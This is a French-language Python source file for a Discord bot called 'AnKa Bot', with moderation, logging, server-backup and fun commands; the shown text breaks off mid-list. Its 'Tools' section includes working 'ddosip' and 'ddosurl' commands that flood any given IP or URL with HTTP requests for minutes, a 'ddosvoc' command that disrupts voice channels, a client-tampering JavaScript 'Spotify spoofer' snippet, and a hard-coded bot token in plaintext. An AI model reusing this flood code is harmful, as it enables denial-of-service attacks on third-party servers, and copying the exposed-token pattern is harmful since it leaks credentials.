import discord
from discord.ext import commands
import requests
import json
import os
import re
import pythonping
from pythonping import ping as pinger
import datetime
import tempfile
import platform
import chardet
import logging
import socket
from discord_buttons_plugin import *
import asyncio
import aiofiles
import pathlib
import phonenumbers
from phonenumbers import carrier, timezone, geocoder
from discord.ext import tasks
import discord
import pyfiglet
from discord.ext import commands
import json
import os
import aiohttp
import random
from pystyle import Colorate, Colors
from discord.utils import get
from discord.utils import snowflake_time
import io
import concurrent.futures
import colorama
from colorama import Style, Fore
import datetime
import whois
import subprocess
colorama.init()

## PUT YOUR TOKEN BOT HERE 
TOKEN= 'MTE5MDAyNjIzOTA0MjM5MjE0NQ.Gsepmm.8KvZfVxk4v5P70rhlyLDU7F7rIK5gQJ1cijwBE'
blacklist_file = 'blacklist.json'
warnings_file = 'warnings.json'
prefix_file = 'prefix.json'
antilink_file = 'antilink.json'

welcome_channels = {}
leave_channels = {}
leave_event_enabled = {}
blacklist = {}
join_counts = {}
blacklist_data = {}

# Charger la configuration antilink
if os.path.exists(antilink_file):
    with open(antilink_file, 'r') as f:
        try:
            antilink_channels = json.load(f)
            if not isinstance(antilink_channels, list):
                antilink_channels = []
        except json.JSONDecodeError:
            antilink_channels = []
else:
    antilink_channels = []

def save_antilink_channels():
    with open(antilink_file, 'w') as f:
        json.dump(antilink_channels, f)


# Charger le préfixe
if os.path.exists(prefix_file) and os.path.getsize(prefix_file) > 0:
    with open(prefix_file, 'r') as f:
        try:
            data = json.load(f)
            if isinstance(data, dict):
                prefix = data.get('prefix', '.')
            else:
                prefix = '.'
        except json.JSONDecodeError:
            prefix = '.'
else:
    prefix = '.'

# Charger la blacklist
if os.path.exists(blacklist_file):
    with open(blacklist_file, 'r') as f:
        try:
            blacklist = json.load(f)
            if not isinstance(blacklist, dict):
                blacklist = {}
        except json.JSONDecodeError:
            blacklist = {}
else:
    blacklist = {}

# Charger les avertissements
if os.path.exists(warnings_file):
    with open(warnings_file, 'r') as f:
        try:
            warnings = json.load(f)
            if not isinstance(warnings, dict):
                warnings = {}
        except json.JSONDecodeError:
            warnings = {}
else:
    warnings = {}

def save_blacklist():
    with open(blacklist_file, 'w') as f:
        json.dump(blacklist, f)

def save_warnings():
    with open(warnings_file, 'w') as f:
        json.dump(warnings, f)

def save_prefix():
    with open(prefix_file, 'w') as f:
        json.dump({'prefix': bot.command_prefix}, f)

intents = discord.Intents.all()
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True
intents.guild_reactions = True
intents.members = True  # Correction ici
intents.voice_states = True
bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command('help')

## INFO PREFIX
@bot.command()
async def prefix(ctx, channel: discord.TextChannel = None):
    channel = channel or ctx.channel
    overwrite = channel.overwrites_for(ctx.guild.default_role)
    overwrite.send_messages = None
    await ctx.send(f'Mon prefix est `+`')

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if bot.user in message.mentions:
        await message.reply('Mon prefix est `+`')
    await bot.process_commands(message)
    
## HELP  
@bot.command()
async def help(ctx):
    color = getattr(bot, 'embed_color', discord.Color.default())
    embed = discord.Embed(title="AnKa Bot", color=color)
    embed.description = ""
    embed.add_field(name="`Moderation`", value="Commandes pour gérer les membres et les salons.", inline=False)
    embed.add_field(name="`Tools`", value="Soon...", inline=False)
    embed.add_field(name="`Utility`", value="Commandes utiles pour les informations sur le serveur et la gestion des membres.", inline=False)
    embed.add_field(name="`Fun`", value="Commandes amusantes pour vous amusez.", inline=False)
    embed.add_field(name="`Bot`", value="Commandes liées au bot.", inline=False)
    embed.add_field(name="`Logs`", value="Commandes liées au logs.", inline=False)
    embed.add_field(name="`Gestion`", value="Commandes de gestion.", inline=False)
    view = HelpMenu()
    await ctx.send(embed=embed, view=view)

class HelpMenu(discord.ui.View):
    def __init__(self):
        super().__init__()

    @discord.ui.button(label="Moderation", style=discord.ButtonStyle.primary, custom_id="help_moderation")
    async def moderation_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        color = getattr(bot, 'embed_color', discord.Color.default())
        embed = discord.Embed(title="Moderation Commands", color=color)
        embed.add_field(name=f"`{bot.command_prefix}ban @user [reason]`", value="Bannir un membre avec une raison.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}kick @user [reason]`", value="Kick un membre avec une raison.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}lock [#channel]`", value="Verrouiller un salon empêchant les membres d'envoyer des messages.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}unlock [#channel]`", value="Débloquez un salon permettant aux membres d'envoyer des messages.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}mute @user [reason]`", value="Mute un membre avec une raison.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}unmute @user`", value="Demute un membre.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}warn @user [reason]`", value="Avertir un membre avec une raison.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}clearwarn @user`", value="Enlever les avertissements d'un membre.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}slowmode #channel [seconds]`", value="Activez le slowmode.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}nickname @user [new_nickname]`", value="Changer le pseudo d'un membre.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}reload`", value="Recrée un salon.", inline=False)
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Utility", style=discord.ButtonStyle.primary, custom_id="help_utility")
    async def utility_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        color = getattr(bot, 'embed_color', discord.Color.default())
        embed = discord.Embed(title="Utility Commands", color=color)
        embed.add_field(name=f"`{bot.command_prefix}members`", value="Liste de tout les membres présent sur le serveur.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}dm @user [message]`", value="Envoyer un message a un membre.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}dmall [message]`", value="Envoyer un message a tout les membres.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}serverinfo`", value="Affichez les informations du serveur.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}userinfo @user`", value="Affichez les informations d'un membre.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}avatar @user`", value="Affichez l'avatar d'un membre.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}roleinfo @role`", value="Display information about a role.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}roles`", value="Liste de tout les roles.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}ping`", value="Le ping du bot.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}delete [amount]`", value="Delete a specified number of messages (default is 50).", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}setprefix [new_prefix]`", value="Choisir un nouveau prefix.", inline=False)
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Fun", style=discord.ButtonStyle.primary, custom_id="help_fun")
    async def fun_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="Fun Commands", color=discord.Color(0xFFFFFF))
        embed.add_field(name=f"`{bot.command_prefix}asmr`", value="Pour écouter de l'ASMR.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}ascii`", value="Pour generer un texte en ASCII.", inline=False)
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Bot", style=discord.ButtonStyle.primary, custom_id="help_bot")
    async def bot_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        color = getattr(bot, 'embed_color', discord.Color.default())
        embed = discord.Embed(title="Bot Commands", color=color)
        embed.add_field(name=f"`{bot.command_prefix}botinfo`", value="Afficher des informations sur le bot.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}invite`", value="Inviter le bot discord.", inline=False)
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Logs", style=discord.ButtonStyle.primary, custom_id="help_logs")
    async def logs_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        color = getattr(bot, 'embed_color', discord.Color.default())
        embed = discord.Embed(title="Logs Commands", color=color)
        embed.add_field(name=f"`{bot.command_prefix}presetlogs`", value="Crée tout les salons logs.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}logdelete`", value="Crée le salon de logs delete message.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}logedit`", value="Crée le salon de logs edit message.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}logban`", value="Crée le salon de logs ban.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}logremove`", value="Create a log channel for member removals.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}logrole`", value="Crée le salon de logs role update.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}logpin`", value="Create a log channel for pinned messages.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}logvoice`", value="Crée le salon de logs d'evenement de vocal.", inline=False)
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Gestion", style=discord.ButtonStyle.primary, custom_id="help_gestion")
    async def gestion_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        color = getattr(bot, 'embed_color', discord.Color.default())
        embed = discord.Embed(title="Gestion Commands", color=color)
        embed.add_field(name=f"`{bot.command_prefix}setwelcome`", value="Définir le salon de bienvenue.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}setremove`", value="Définir le salon de départ.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}blacklistadd @user`", value="Add a user to the blacklist.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}blacklistremove @user`", value="Remove a user from the blacklist.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}blacklistlist`", value="Show the blacklist.", inline=False)
        embed.add_field(name=f"`{bot.command_prefix}cembed`", value="Crée un embed personalisée.", inline=False)
        await interaction.response.edit_message(embed=embed, view=self)
        
    @discord.ui.button(label="Tools", style=discord.ButtonStyle.primary, custom_id="help_tools")
    async def tools_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        color = getattr(bot, 'embed_color', discord.Color.default())
        embed = discord.Embed(title="Tools Commands", color=color)
        embed.add_field(name=f"`ddosip`", value="DDoS une adresse IP.", inline=False)
        embed.add_field(name=f"`ddosurl`", value="DDoS une url.", inline=False)
        embed.add_field(name=f"`ddosvoc`", value="DDoS les vocaux du serveur.", inline=False)
        embed.add_field(name=f"`geoip`", value="Géocaliser une adresse IP.", inline=False)
        await interaction.response.edit_message(embed=embed, view=self)
    
## SET ACTIVITY
@bot.command()
@commands.has_permissions(administrator=True)
async def status(ctx, status: str = None, activity_type: str = None, *, activity_name: str = None):
    statuses = {
        "online": discord.Status.online,
        "dnd": discord.Status.do_not_disturb,
        "idle": discord.Status.idle,
        "invisible": discord.Status.invisible,
    }
    activity_types = {
        "playing": discord.ActivityType.playing,
        "streaming": discord.ActivityType.streaming,
        "listening": discord.ActivityType.listening,
        "watching": discord.ActivityType.watching,
    }

    if status is None or activity_type is None or activity_name is None:
        color = getattr(bot, 'embed_color', discord.Color.default())
        embed = discord.Embed(title="Changer le statut du bot", color=color)
        embed.add_field(name="Usage", value=f"`{bot.command_prefix}status <status> <activity_type> <activity_name>`", inline=False)
        embed.add_field(name="Status options", value="`online`, `dnd`, `idle`, `invisible`", inline=False)
        embed.add_field(name="Activity type options", value="`playing`, `streaming`, `listening`, `watching`", inline=False)
        embed.add_field(name="Exemple", value=f"`{bot.command_prefix}status online playing En train de jouer à un jeu`", inline=False)
        await ctx.send(embed=embed)
        return

    if status not in statuses:
        await ctx.send("Statut invalide. Les options valides sont: online, dnd, idle, invisible.")
        return

    if activity_type not in activity_types:
        await ctx.send("Type d'activité invalide. Les options valides sont: playing, streaming, listening, watching.")
        return

    await bot.change_presence(
        status=statuses[status],
        activity=discord.Activity(type=activity_types[activity_type], name=activity_name)
    )
    await ctx.send(f"Statut changé en {status} avec l'activité {activity_type} : {activity_name}")
    
## HYPESQUAD
@bot.command()
@commands.has_permissions(administrator=True)
async def robhypesquad(ctx, user: discord.User = None):
    if user is None:
        await ctx.send("Veuillez mentionner un utilisateur ou fournir un ID d'utilisateur.")
        return

    try:
        user = await bot.fetch_user(user.id)
    except discord.NotFound:
        await ctx.send(f"Aucun utilisateur trouvé pour `{user.id}`")
        return

    flags = await user.public_flags()

    hypesquad_houses = {
        "HOUSE_BRILLIANCE": discord.UserFlags.hypesquad_brilliance,
        "HOUSE_BRAVERY": discord.UserFlags.hypesquad_bravery,
        "HOUSE_BALANCE": discord.UserFlags.hypesquad_balance
    }

    user_hypesquad = [house for house, flag in hypesquad_houses.items() if flags.value & flag.value]

    if not user_hypesquad:
        await ctx.send("Cet utilisateur n'a pas de badge de la HypeSquad.")
        return

    badge_message = f"Cet utilisateur a les badges HypeSquad suivants: {', '.join(user_hypesquad)}"
    await ctx.send(badge_message)
    
    # Notez que la modification des badges HypeSquad du bot n'est pas possible via discord.py
    # Vous pouvez ajouter un message fictif ici si vous le souhaitez
    await ctx.send("Vos badges n'ont pas été modifiés, car cette action n'est pas supportée par l'API Discord pour les bots.")
    
        
## LINK TWITCH
# Simuler une base de données pour stocker les informations du bot
class BotDatabase:
    def __init__(self):
        self.language = "en"
        self.twitch = None

    def save(self):
        # Simulez la sauvegarde de la base de données
        pass

# Instance de la base de données
bot.db = BotDatabase()

@bot.command()
@commands.has_permissions(administrator=True)
async def settwitch(ctx, url: str):
    twitch_url_pattern = re.compile(r"https://www.twitch.tv/")

    if not twitch_url_pattern.match(url):
        if bot.db.language == "fr":
            await ctx.send("Veuillez entrer une URL valide.")
        else:
            await ctx.send("Please enter a valid URL.")
        return

    bot.db.twitch = url
    bot.db.save()

    if bot.db.language == "fr":
        await ctx.send("L'URL Twitch a été modifiée.")
    else:
        await ctx.send("The Twitch URL has been edited.")
        
## SPOTIFY SPOOFER

# Simuler une base de données pour stocker les informations du bot
class BotDatabase:
    def __init__(self):
        self.name = "[+] Galaxia"

    def save(self):
        # Simulez la sauvegarde de la base de données
        pass

# Instance de la base de données
bot.db = BotDatabase()

@bot.command()
@commands.has_permissions(administrator=True)
async def spotifyspoofer(ctx):
    message_content = (
        f"⛧ __**{bot.db.name}**__ ⛧\n"
        "```js\n"
        "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)"
        ".find(m => m?.exports?.Z?.getAccounts).exports.Z.getAccounts().forEach((conn) => "
        "conn.type === 'spotify' && (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)"
        ".find(m => m?.exports?.Z?.isDispatching).exports.Z.dispatch({type: 'SPOTIFY_PROFILE_UPDATE', accountId: conn.id, isPremium: true}))"
        "```"
    )
    await ctx.send(message_content)
    
## ALL ACTIVITY

#BOT DATABASE

class BotDatabase:
    def __init__(self):
        self.rpc = False
        self.rpcname = ""
        self.rpcdetails = ""
        self.rpcstate = ""
        self.rpctimestamp = False
        self.rpclargeimage = ""
        self.rpclargeimagetext = ""
        self.rpcsmallimage = ""
        self.rpcsmallimagetext = ""
        self.rpctype = "WATCHING"
        self.rpcpartymin = 0
        self.rpcpartymax = 0
        self.rpcbuttontext = None
        self.rpcbuttonlink = None
        self.rpcbuttontext2 = None
        self.rpcbuttonlink2 = None
        self.name = ""
        
    def save(self):
        # Save database state to a file or any persistent storage
        pass

    def trad(self, en_message, fr_message):
        # Placeholder for translation handling
        return en_message  # Or return fr_message for French


# Initialize the bot's database
bot.db = BotDatabase()

#PORNHUB

@bot.command()
@commands.has_permissions(administrator=True)
async def pornhub(ctx, *, activity_name=None):
    bot.db.rpc = True
    bot.db.rpcname = "Pornhub"
    bot.db.rpcdetails = activity_name or bot.db.name
    bot.db.rpcstate = "On Pornhub"
    bot.db.rpctimestamp = True
    bot.db.rpclargeimage = "https://media.tenor.com/_xDwnsYhuxcAAAAe/ph.png"
    bot.db.rpclargeimagetext = None
    bot.db.rpcsmallimage = None
    bot.db.rpcsmallimagetext = None
    bot.db.rpctype = "WATCHING"
    bot.db.rpcpartymin = 0
    bot.db.rpcpartymax = 0
    bot.db.rpcbuttontext = None
    bot.db.rpcbuttonlink = None
    bot.db.rpcbuttontext2 = None
    bot.db.rpcbuttonlink2 = None
    bot.db.save()

    # Update the bot's activity
    activity = discord.Activity(
        name=bot.db.rpcdetails,
        type=discord.ActivityType.watching,
        state=bot.db.rpcstate,
        assets={
            'large_image': bot.db.rpclargeimage
        }
    )
    await bot.change_presence(activity=activity)

    await ctx.send(bot.db.trad(
        f"You're now watching `{bot.db.rpcdetails}` on **Pornhub**",
        f"Vous regardez maintenant `{bot.db.rpcdetails}` sur **Pornhub**"
    ))

    
#TIKTOK
@bot.command()
@commands.has_permissions(administrator=True)
async def tiktok(ctx, *, activity_name=None):
    bot.db.rpc = True
    bot.db.rpcname = "Tiktok"
    bot.db.rpcdetails = activity_name or bot.db.name
    bot.db.rpcstate = "On TikTok"
    bot.db.rpctimestamp = True
    bot.db.rpclargeimage = "https://media.tenor.com/_xDwnsYhuxcAAAAe/ph.png"
    bot.db.rpclargeimagetext = None
    bot.db.rpcsmallimage = None
    bot.db.rpcsmallimagetext = None
    bot.db.rpctype = "WATCHING"
    bot.db.rpcpartymin = 0
    bot.db.rpcpartymax = 0
    bot.db.rpcbuttontext = None
    bot.db.rpcbuttonlink = None
    bot.db.rpcbuttontext2 = None
    bot.db.rpcbuttonlink2 = None
    bot.db.save()

    # Update the bot's activity
    activity = discord.Activity(
        name=bot.db.rpcdetails,
        type=discord.ActivityType.watching,
        state=bot.db.rpcstate,
        assets={
            'large_image': bot.db.rpclargeimage
        }
    )
    await bot.change_presence(activity=activity)

    await ctx.send(bot.db.trad(
        f"You're now watching `{bot.db.rpcdetails}` on **Pornhub**",
        f"Vous regardez maintenant `{bot.db.rpcdetails}` sur **Pornhub**"
    ))
    
## STREAMING
class BotDatabase:
    def __init__(self):
        self.name = "Default Stream"
        self.twitch = "https://www.twitch.tv/ankafran"  # Replace with your actual Twitch URL
        
    def trad(self, en_message, fr_message):
        # Placeholder for translation handling
        return en_message  # Or return fr_message for French

# Initialize the bot's database
bot.db = BotDatabase()

@bot.command(name='streaming')
async def streaming(ctx, *, text: str = None):
    stream_text = text or bot.db.name

    # Set the bot's activity to streaming
    await bot.change_presence(activity=discord.Streaming(
        name=stream_text,
        url=bot.db.twitch
    ))

    # Send a confirmation message
    await ctx.send(bot.db.trad(
        f"You are **streaming** `{stream_text}`",
        f"Vous êtes en train de **streamer** `{stream_text}`"
    ))

## CHANGE COLOR EMBED
colors = {
    'black': '#000000',
    'white': '#ffffff',
    'red': '#ff0000',
    'purple': '#ff00f8',
    'blue': '#1a00ff'
}

@bot.command()
@commands.has_permissions(administrator=True)
async def setcolor(ctx, color: str):
    color = color.lower()
    if color in colors:
        hex_color = colors[color]
        try:
            discord_color = discord.Color(int(hex_color.strip('#'), 16))
            bot.embed_color = discord_color
            await ctx.send(f'La couleur des embeds a été changée en {color}.')
        except ValueError:
            await ctx.send('Erreur lors de la conversion de la couleur.')
    else:
        await ctx.send('Veuillez fournir une couleur valide (black, white, red, purple, blue).')
    
## ALL COMMANDS BACKUP
@bot.command()
@commands.has_permissions(administrator=True)
async def backup(ctx, type: str, name: str):
    if type.lower() == 'serveur':
        await backup_server(ctx.guild, name, ctx)
    elif type.lower() == 'emoji':
        await backup_emojis(ctx.guild, name, ctx)
    else:
        await ctx.send('Type de backup invalide. Utilisation : `backup serveur|emoji <nom>`')

async def backup_server(guild, name, ctx):
    guild_data = {
        'name': guild.name,
        'icon': str(guild.icon.url) if guild.icon else None,
        'channels': [
            {
                'id': c.id,
                'name': c.name,
                'type': str(c.type),
                'category': c.category.id if c.category else None,
                'position': c.position,
                'topic': c.topic if isinstance(c, discord.TextChannel) else None
            }
            for c in guild.channels
        ],
        'roles': [{'name': r.name, 'color': r.color.value} for r in guild.roles],
        'emojis': [{'name': e.name, 'url': str(e.url)} for e in guild.emojis],
        'members': [{'id': m.id, 'name': m.name, 'discriminator': m.discriminator} for m in guild.members]
    }
    with open(f'./backups/{name}_serveur.json', 'w') as f:
        json.dump(guild_data, f, indent=4)
    await ctx.send(f'Backup "{name}" créée avec succès.')

async def backup_emojis(guild, name, ctx):
    emojis_data = [{'name': e.name, 'url': str(e.url)} for e in guild.emojis]
    with open(f'./backups/{name}_emojis.json', 'w') as f:
        json.dump(emojis_data, f, indent=4)
    await ctx.send(f'Backup "{name}" créée avec succès.')

@bot.command()
@commands.has_permissions(administrator=True)
async def backuplist(ctx, type: str):
    if type.lower() == 'serveur':
        await list_server_backups(ctx)
    elif type.lower() == 'emoji':
        await list_emoji_backups(ctx)
    else:
        await ctx.send('Utilisation incorrecte. Utilisation : `backuplist serveur|emoji`')

async def list_server_backups(ctx):
    backup_files = [f for f in os.listdir('./backups') if f.endswith('_serveur.json')]
    if not backup_files:
        await ctx.send('Aucune backup de serveur trouvée.')
        return
    embed = discord.Embed(
        title="Liste des backups de serveur",
        description='\n'.join([f.replace('_serveur.json', '') for f in backup_files]),
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed)

async def list_emoji_backups(ctx):
    backup_files = [f for f in os.listdir('./backups') if f.endswith('_emojis.json')]
    if not backup_files:
        await ctx.send('Aucune backup d\'emoji trouvée.')
        return
    embed = discord.Embed(
        title="Liste des backups d'emoji",
        description='\n'.join([f.replace('_emojis.json', '') for f in backup_files]),
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

@bot.command()
@commands.has_permissions(administrator=True)
async def backupload(ctx, type: str, name: str):
    if type.lower() == 'serveur':
        await load_server_backup(ctx.guild, name, ctx)
    elif type.lower() == 'emoji':
        await load_emoji_backup(ctx.guild, name, ctx)
    else:
        await ctx.send('Type de backup invalide. Utilisation : `backupload serveur|emoji <nom>`')

async def load_server_backup(guild, name, ctx):
    file_path = f'./backups/{name}_serveur.json'
    try:
        with open(file_path, 'r') as f:
            backup_data = json.load(f)
        await restore_guild_data(guild, backup_data, ctx)
        await ctx.send(f'Backup "{name}" chargée avec succès dans le serveur.')
    except FileNotFoundError:
        await ctx.send(f'Aucune backup nommée "{name}" trouvée.')

async def load_emoji_backup(guild, name, ctx):
    file_path = f'./backups/{name}_emojis.json'
    try:
        with open(file_path, 'r') as f:
            backup_data = json.load(f)
        await restore_emojis(guild, backup_data)
        await ctx.send(f'Backup "{name}" chargée avec succès pour les emojis.')
    except FileNotFoundError:
        await ctx.send(f'Aucune backup nommée "{name}" trouvée.')

async def restore_guild_data(guild, backup_data, ctx):
    # Supprimer les canaux existants
    for channel in guild.channels:
        await channel.delete()
    
    # Créer les catégories d'abord
    category_mapping = {}
    for channel_data in backup_data['channels']:
        if channel_data['type'] == 'category':
            category = await guild.create_category(
                name=channel_data['name'],
                position=channel_data['position']
            )
            category_mapping[channel_data['id']] = category
    
    # Créer les salons et assigner les catégories
    for channel_data in backup_data['channels']:
        if channel_data['type'] == 'text':
            await guild.create_text_channel(
                name=channel_data['name'],
                category=category_mapping.get(channel_data['category']),
                position=channel_data['position'],
                topic=channel_data['topic']
            )
        elif channel_data['type'] == 'voice':
            await guild.create_voice_channel(
                name=channel_data['name'],
                category=category_mapping.get(channel_data['category']),
                position=channel_data['position']
            )

async def restore_emojis(guild, backup_data):
    for emoji_data in backup_data:
        async with aiohttp.ClientSession() as session:
            async with session.get(emoji_data['url']) as resp:
                if resp.status != 200:
                    continue
                data = await resp.read()
                await guild.create_custom_emoji(name=emoji_data['name'], image=data)

##################################### TOOLS ###########################################
    
## PHONE INFO
@bot.command()
async def phonenumber(ctx, *, phone_number: str):
    try:
        await ctx.send("📞 **Récupération des informations...**")

        try:
            parsed_number = phonenumbers.parse(phone_number, None)
            if phonenumbers.is_valid_number(parsed_number):
                country_code = parsed_number.country_code
                operator = carrier.name_for_number(parsed_number, "fr")
                type_number = "Mobile" if phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.MOBILE else "Fixe"
                timezones = timezone.time_zones_for_number(parsed_number)
                timezone_info = timezones[0] if timezones else "Aucune"
                country = phonenumbers.region_code_for_number(parsed_number)
                region = geocoder.description_for_number(parsed_number, "fr")

                embed = discord.Embed(title="📱 Informations du Numéro", color=discord.Color.default())
                embed.add_field(name="Numéro de Téléphone", value=phone_number, inline=False)
                embed.add_field(name="Code Pays", value=country_code, inline=True)
                embed.add_field(name="Pays", value=country, inline=True)
                embed.add_field(name="Région", value=region, inline=True)
                embed.add_field(name="Fuseau Horaire", value=timezone_info, inline=True)
                embed.add_field(name="Opérateur", value=operator, inline=True)
                embed.add_field(name="Type de Numéro", value=type_number, inline=True)
                embed.set_footer(text="Données récupérées avec succès !")
                
                await ctx.send(embed=embed)
            else:
                await ctx.send("❌ Format invalide ! [Ex: +442012345678 ou +33623456789]")

        except phonenumbers.NumberParseException as e:
            await ctx.send(f"⚠️ Erreur de formatage du numéro: {e}")
        except Exception as e:
            await ctx.send(f"❗ Une exception s'est produite: {e}")

    except Exception as e:
        await ctx.send(f"❌ Erreur: {e}")
        
## GEOIP
@bot.command()
async def geoip(ctx, ip: str):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}").json()
        
        color = getattr(bot, 'embed_color', discord.Color.default())
        embed = discord.Embed(title=f"IP Information for {ip}", color=color)       

        if 'query' in response and response['query']:
            embed.add_field(name="IP Address", value=f"`{response['query']}`", inline=True)
        else:
            embed.add_field(name="IP Address", value="N/A", inline=True)

        if 'timezone' in response and response['timezone']:
            embed.add_field(name="Timezone", value=f"`{response['timezone']}`", inline=True)
        else:
            embed.add_field(name="Timezone", value="N/A", inline=True)
        
        if 'country' in response and response['country']:
            embed.add_field(name="Country", value=f"`{response['country']}`", inline=True)
        else:
            embed.add_field(name="Country", value="N/A", inline=True)
                               
        if 'regionName' in response and response['regionName']:
            embed.add_field(name="Region", value=f"`{response['regionName']}`", inline=True)
        else:
            embed.add_field(name="Region", value="N/A", inline=True)
        
        if 'city' in response and response['city']:
            embed.add_field(name="City", value=f"`{response['city']}`", inline=True)
        else:
            embed.add_field(name="City", value="N/A", inline=True)
        
        if 'zip' in response and response['zip']:
            embed.add_field(name="Postal Code", value=f"`{response['zip']}`", inline=True)
        else:
            embed.add_field(name="Postal Code", value="Not available", inline=True)
            
        if 'lat' in response and response['lat']:
            embed.add_field(name="Latitude", value=f"`{response['lat']}`", inline=True)
        else:
            embed.add_field(name="Latitude", value="Not available", inline=True)
            
        if 'lon' in response and response['lon']:
            embed.add_field(name="Longitude", value=f"`{response['lon']}`", inline=True)
        else:
            embed.add_field(name="Longitude", value="Not available", inline=True)
            
        embed.set_footer(text="AnKa Bot", icon_url="")
        
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")
        
## DDOS VOC
@bot.command()
@commands.has_permissions(manage_guild=True)
async def ddosvoc(ctx):
    if not ctx.guild:
        await ctx.send("Veuillez exécuter cette commande dans un serveur.")
        return

    regions = ["russia", "india", "japan", "europe"]

    await ctx.send("DDOS en cours...")

    for _ in range(9):
        for channel in ctx.guild.voice_channels:
            new_region = regions[_ % len(regions)]
            await channel.edit(rtc_region=new_region)

    await ctx.send("DDOS terminé.")
    
## DDOS IP
@bot.command()
@commands.has_permissions(administrator=True)
async def ddosip(ctx, ip: str):
    # Validation de l'IP
    if not ip or len(ip.split(".")) != 4 or not all(part.isdigit() and 0 <= int(part) <= 255 for part in ip.split(".")):
        await ctx.send("Veuillez entrer une IP valide.")
        return

    await ctx.send("Lancement du DDOS")

    async def send_request():
        async with aiohttp.ClientSession() as session:
            while True:
                try:
                    async with session.get(f"http://{ip}:80") as response:
                        pass
                except:
                    pass
                await asyncio.sleep(0)  # Yield control to other tasks

    task = bot.loop.create_task(send_request())

    # Arrêter le DDOS après 5 minutes
    await asyncio.sleep(1000 * 60 * 5)
    task.cancel()
    await ctx.send("DDOS terminé.")
    
## DDOS URL
@bot.command()
async def ddosurl(ctx, url: str = None):
    if not url or not url.startswith("http"):
        await ctx.send("Veuillez entrer une url de site valide / Please enter a valid website URL")
        return
    
    await ctx.send("Lancement du DDOS / DDOS starting")

    async with aiohttp.ClientSession() as session:
        end_time = asyncio.get_event_loop().time() + 60 * 5  # Run for 5 minutes
        while asyncio.get_event_loop().time() < end_time:
            try:
                async with session.get(url) as response:
                    pass
            except:
                pass

    await ctx.send("DDOS terminé / DDOS finished")
        
##################################### FUN ###########################################

## AASCI
@bot.command()
async def ascii(ctx, *, text: str = None):
    if not text:
        await ctx.send("Veuillez envoyer un texte / Please provide a text")
        return
    
    try:
        # Generate ASCII art
        ascii_art = pyfiglet.figlet_format(text)
        
        # Send the ASCII art as a message
        await ctx.send(f"```ascii\n{ascii_art}\n```")
        
        # Optionally delete the user's message
        await ctx.message.delete()
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")
        
## ASMR
@bot.command()
async def asmr(ctx):
    responses = [
        "https://youtu.be/4J8QGkzd8A4?si=dda1lilT_Ou34yO5",
        "https://youtu.be/yDztgPuRydc?si=NU4qh7aukauv-jgq",
        "https://youtu.be/aaUxKjkg8wM?si=lGNCIq8vOwHyd_t6",
        "https://youtu.be/XiCL13rTmaA?si=mO3TcltgrVtoO2Hf",
        "https://youtu.be/2ok3IznP4Hs?si=k8fgk-dGP6UOfv3C",
        "https://youtu.be/Ex9d24aun1I?si=i0m8vSupksJH-3pm",
        "https://youtu.be/zGHFRSBTYRI?si=5l_NaLMnDJ-kymYK",
        "https://youtu.be/uP8MOC5oPBc?si=KJJIsJPUvVIoe89q",
        "https://youtu.be/NCYzqUrdNoI?si=LFmtKPRHTjJ0iFNM",
        "https://youtu.be/IaRgp5I3kfA?si=_SWKupcFWWTxaYbL",
        "https://youtu.be/yZHbJMwTeWU?si=0GXobEe1p0-PMg0k",
